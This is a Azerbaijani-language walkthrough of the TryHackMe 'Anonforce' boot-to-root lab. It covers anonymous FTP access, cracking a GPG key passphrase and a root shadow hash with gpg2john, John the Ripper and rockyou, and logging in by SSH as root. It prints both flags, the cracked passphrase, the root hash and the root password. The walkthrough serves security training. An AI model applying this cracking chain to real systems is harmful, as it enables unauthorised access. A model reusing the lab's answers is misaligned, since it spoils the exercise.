# 🕵️ TryHackMe — Anonforce | Tam Writeup

> **Çətinlik:** Asan  
> **Kateqoriya:** Boot2Root, Linux, FTP, GPG, Password Cracking  
> **Məqsəd:** `user.txt` və `root.txt` flaglarını tapmaq

---

## 📌 Mündəricat

1. [Kəşfiyyat — Nmap Skan](#1-kəşfiyyat--nmap-skan)
2. [FTP-yə Anonymous Giriş](#2-ftpyə-anonymous-giriş)
3. [User Flag Tapılması](#3-user-flag-tapılması)
4. [Gizli Faylların Kəşfi](#4-gizli-faylların-kəşfi)
5. [GPG Private Key-in Şifrəsinin Sındırılması](#5-gpg-private-keyin-şifrəsinin-sındırılması)
6. [Backup Faylının Deşifrəsi](#6-backup-faylının-deşifrəsi)
7. [Root Hash-in Sındırılması](#7-root-hashin-sındırılması)
8. [Root Girişi və Son Flag](#8-root-girişi-və-son-flag)
9. [Nəticə və Öyrənilən Dərslər](#9-nəticə-və-öyrənilən-dərslər)

---

## 1. Kəşfiyyat — Nmap Skan

Hər pentest və CTF tapşırığı **kəşfiyyat (reconnaissance)** mərhələsi ilə başlayır. Məqsəd hədəf sistemdə hansı portların açıq olduğunu, hansı servislərin işlədiyini və versiya məlumatlarını öyrənməkdir. Bu məlumatlar sonrakı bütün addımların əsasını təşkil edir.

```bash
nmap -sC -sV <HƏDƏF_IP>
```

**Əmrin izahı:**
- `-sC` — Default skriptləri işlədir (servisin daha çox detalını açır)
- `-sV` — Servis versiyalarını aşkar edir

**Nmap nəticəsi:**

```
21/tcp open  ftp     vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8
```

**Nə gördük və nə düşündük?**

İki açıq port var: **FTP (21)** və **SSH (22)**. Burada ən kritik detal `ftp-anon: Anonymous FTP login allowed` sətridir. Bu o deməkdir ki, FTP serverinə heç bir şifrə olmadan, sadəcə `anonymous` istifadəçi adı ilə daxil olmaq mümkündür. Bu, server konfiqurasiyasında ciddi bir səhvdir və birbaşa araşdırılmalıdır.

SSH tərəfə baxanda `OpenSSH 7.2p2` versiyası görünür. Bu versiyanın Username Enumeration zəifliyi məlumdur, lakin bizim üçün hazırda FTP daha sərfəlidir — çünki artıq açıq qapı var.

---

## 2. FTP-yə Anonymous Giriş

Nmap-in verdiyi məlumatı dərhal test edirik. FTP-yə qoşularkən şifrə soruşulduqda sadəcə Enter basmaq kifayətdir — anonim girişdə şifrə tələb olunmur.

```bash
ftp <HƏDƏF_IP>
```

```
Name: anonymous
Password: (boş — sadəcə Enter)
```

Giriş uğurlu oldu. İndi sistemin içini araşdırmağa başlayırıq.

**Niyə hər yerə baxmaq lazımdır?**

FTP-yə daxil olduqdan sonra bir çox insan yalnız gördüyü ilk faylara baxır. Halbuki peşəkar pentest yanaşması **sistematik enumeration** tələb edir — yəni kök qovluqdan başlayaraq hər alt qovluğa girib `ls -la` ilə bütün faylları (gizliləri də daxil olmaqla) yoxlamaq lazımdır. `-la` flag-i xüsusilə vacibdir, çünki `.` ilə başlayan gizli faylları da göstərir.

```ftp
ftp> ls -la
ftp> cd home
ftp> ls -la
```

`home` qovluğunun içini açdıqda `melodias` adlı bir istifadəçi qovluğu gördük:

```
drwxr-xr-x    4 1000     1000         4096 Aug 11  2019 melodias
```

---

## 3. User Flag Tapılması

`melodias` qovluğuna daxil olduq:

```ftp
ftp> cd melodias
ftp> ls -la
```

```
-rw-rw-r--    1 1000     1000           33 Aug 11  2019 user.txt
```

`user.txt` faylı burada idi. FTP-nin `get` əmri ilə faylı local maşınımıza yükləyirik:

```ftp
ftp> get user.txt
```

```bash
cat user.txt
```

```
606083fd33beb1284fc51f411a706af8
```

**İlk flag əldə edildi! ✅**

**Burada öyrənilən dərs:** Linux sistemlərində istifadəçi flagları adətən `/home/<username>/` altında olur. CTF-lərdə bu standart yerdir, amma real pentest-də də istifadəçi home qovluqları həmişə ilk yoxlanılmalı olan yerlərdəndir — çünki orada şifrələr, SSH key-lər, konfiqurasiya faylları və digər həssas məlumatlar ola bilər.

---

## 4. Gizli Faylların Kəşfi

İlk flag tapıldıqdan sonra araşdırmanı dayandırmadıq. **Enumeration heç vaxt birinci tapıntıda bitmir.** FTP-nin kök qovluğuna qayıtdıq və sistematik şəkildə hər yerə baxmağa davam etdik:

```ftp
ftp> cd /
ftp> ls -la
```

Burada `notread` adlı bir qovluq diqqətimizi çəkdi. Adının özü artıq şübhəlidir — sanki kimsə bu qovluğun oxunmasını istəmir. Məhz bu cür adlandırılmış qovluqlar pentest-də həmişə prioritet olaraq yoxlanılmalıdır.

```ftp
ftp> cd notread
ftp> ls -la
```

```
-rwxrwxrwx    1 1000     1000         524 Aug 11  2019 backup.pgp
-rwxrwxrwx    1 1000     1000        3762 Aug 11  2019 private.asc
```

İki kritik fayl tapdıq:

- **`private.asc`** — GPG (GNU Privacy Guard) private key faylıdır. `.asc` formatı ASCII-armored GPG key deməkdir. Bu faylın varlığı o deməkdir ki, burada şifrəli bir şey var.
- **`backup.pgp`** — `.pgp` uzantısı PGP/GPG ilə şifrələnmiş backup faylıdır. `private.asc` ilə birlikdə tapılması təsadüf deyil — bu key məhz bu faylı açmaq üçündür.

Hər iki faylı yükləyirik:

```ftp
ftp> get backup.pgp
ftp> get private.asc
```

**Niyə bu fayllar bu qədər vacibdir?**

GPG private key bir növ "master açar"dır. Əgər bu key-in şifrəsini sındıra bilsək, onunla şifrələnmiş hər şeyi oxuya bilərik. `backup.pgp` isə çox güman ki, sistem backup-ıdır — içində şifrə hash-ləri, konfiqurasiyalar və ya digər həssas məlumatlar ola bilər.

---

## 5. GPG Private Key-in Şifrəsinin Sındırılması

GPG private key-lər adətən bir passphrase (keçid ifadəsi) ilə qorunur. Bizdə key var, amma onu istifadə etmək üçün bu passphrase lazımdır. Burada **`gpg2john`** alətindən istifadə edirik.

**`gpg2john` nədir?**  
John the Ripper paket daxilindəki bu alət GPG key fayllarını John-un anlaya biləcəyi hash formatına çevirir. Yəni GPG key-dən hash çıxarır ki, John the Ripper onu wordlist ilə sındıra bilsin.

```bash
gpg2john private.asc > privatex
```

Bu əmr `private.asc` faylını oxuyur və `privatex` adlı fayla John-uyğun hash formatında yazır.

İndi John the Ripper ilə `rockyou.txt` wordlist-ini istifadə edərək passphrase-i sındırırıq:

```bash
john privatex --wordlist=/usr/share/wordlists/rockyou.txt
```

**Niyə `rockyou.txt`?**  
`rockyou.txt` real bir data breach-dən əldə edilmiş 14 milyondan çox şifrəni ehtiva edən ən populyar wordlist-lərdən biridir. İnsanların real həyatda istifadə etdiyi şifrələri əhatə etdiyi üçün CTF-lərdə və real pentest-lərdə çox effektivdir.

**John nəticəsi:**

```
xbox360          (anonforce)
1g 0:00:00:00 DONE
```

Passphrase tapıldı: **`xbox360`** ✅

Bu nəticə bir neçə saniyə ərzində gəldi — bu, zəif şifrənin nə qədər tez sındırıla biləcəyini göstərir.

---

## 6. Backup Faylının Deşifrəsi

Artıq bizdə private key (`private.asc`) və onun passphrase-i (`xbox360`) var. İndi `backup.pgp` faylını deşifrə edə bilərik.

**Addım 1 — Private key-i GPG keyring-ə import edirik:**

```bash
gpg --import private.asc
```

Şifrə soruşulduqda `xbox360` yazırıq. Bu addım key-i sistemin GPG keyring-inə əlavə edir ki, deşifrə əməliyyatında istifadə oluna bilsin.

**Addım 2 — Backup faylını deşifrə edirik:**

```bash
gpg --decrypt backup.pgp
```

Yenə passphrase olaraq `xbox360` daxil edirik.

**Deşifrə edilmiş məzmun:**

```
root:$6$07nYFaYf$F4VMaegmz7dKjsTukBLh6cP01iMmL7CiQDt1ycIm6a.bsOIBp0DwXVb9XI2EtULXJzBtaMZMNd2tV4uob5RVM0:18120:0:99999:7:::
```

Bu `/etc/shadow` faylının məzmunudur! `/etc/shadow` Linux-da bütün istifadəçilərin şifrə hash-lərini saxlayan fayldır və normal şəraitdə yalnız root tərəfindən oxuna bilir. Burada **root-un şifrə hash-ini** əldə etdik.

**Hash formatının izahı:**

```
root        → istifadəçi adı
$6$         → SHA-512 hash alqoritmi istifadə edilib
$07nYFaYf$  → salt dəyəri (hash-i unikal edən əlavə)
F4VMaeg...  → əsl hash dəyəri
```

---

## 7. Root Hash-in Sındırılması

Root hash-ini bir fayla yazırıq:

```bash
echo 'root:$6$07nYFaYf$F4VMaegmz7dKjsTukBLh6cP01iMmL7CiQDt1ycIm6a.bsOIBp0DwXVb9XI2EtULXJzBtaMZMNd2tV4uob5RVM0:18120:0:99999:7:::' > hash.txt
```

John the Ripper ilə sındırırıq:

```bash
john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
```

**Nəticə:**

```
hikari           (root)
1g 0:00:00:02 DONE
```

Root şifrəsi tapıldı: **`hikari`** ✅

`hikari` Yapon dilində "işıq" deməkdir. CTF-lərdə bu cür tematik şifrələr tez-tez istifadə olunur.

---

## 8. Root Girişi və Son Flag

Artıq root şifrəsinə sahibik. SSH vasitəsilə birbaşa root kimi daxil oluruq:

```bash
ssh root@<HƏDƏF_IP>
```

Şifrə: `hikari`

Daxil olduqdan sonra:

```bash
cat /root/root.txt
```

```
f706456440c7af4187810c31c6cebdce
```

**Root flag əldə edildi! ✅**

---

## 9. Nəticə və Öyrənilən Dərslər

### Tam Attack Zənciri:

```
Nmap skan
  → FTP Anonymous Login (vsftpd 3.0.3)
      → /home/melodias/user.txt  ✅ (User Flag)
      → /notread/backup.pgp + private.asc
           → gpg2john + john + rockyou.txt
               → Passphrase: xbox360
               → gpg --decrypt backup.pgp
                   → /etc/shadow → root hash
                       → john + rockyou.txt
                           → Root şifrəsi: hikari
                           → SSH root login
                               → /root/root.txt  ✅ (Root Flag)
```

### Bu Maşından Öyrəndiklərimiz:

| Zəiflik | Real Dünyada Təsiri |
|---|---|
| Anonymous FTP Login | Hər kəs sisteme daxil ola bilər |
| Həssas faylların FTP-də saxlanması | Private key-lər, backup-lar ictimai olur |
| Zəif GPG passphrase | Wordlist ilə saniyələr içində sındırılır |
| Root hash-in backup-da olması | Tam sistem kompromisi |
| Zəif root şifrəsi | Wordlist ilə kolayca kırılır |

### Pentest Metodologiyası Baxımından:

1. **Heç vaxt tək tapıntı ilə dayanma** — `user.txt` tapandan sonra araşdırmaya davam etmək `root.txt`-ə apardı.
2. **Fayl adlarına diqqət et** — `notread`, `backup`, `private` kimi adlar həmişə şübhəlidir.
3. **Hər şeyi yüklə, sonra analiz et** — FTP-dəki faylları local maşına çəkmək offline analiz imkanı verir.
4. **Alətlər zənciri qur** — `gpg2john → john → gpg → john → ssh` ardıcıllığı bir tapıntını digərinə bağladı.
5. **Sistematik enumeration** — `ls -la` ilə hər qovluğu yoxlamaq gizli faylları aşkar etdi.

---

*Bu writeup yalnız təhsil məqsədi ilə yazılmışdır. TryHackMe platformasındakı Anonforce otağına aiddir.*
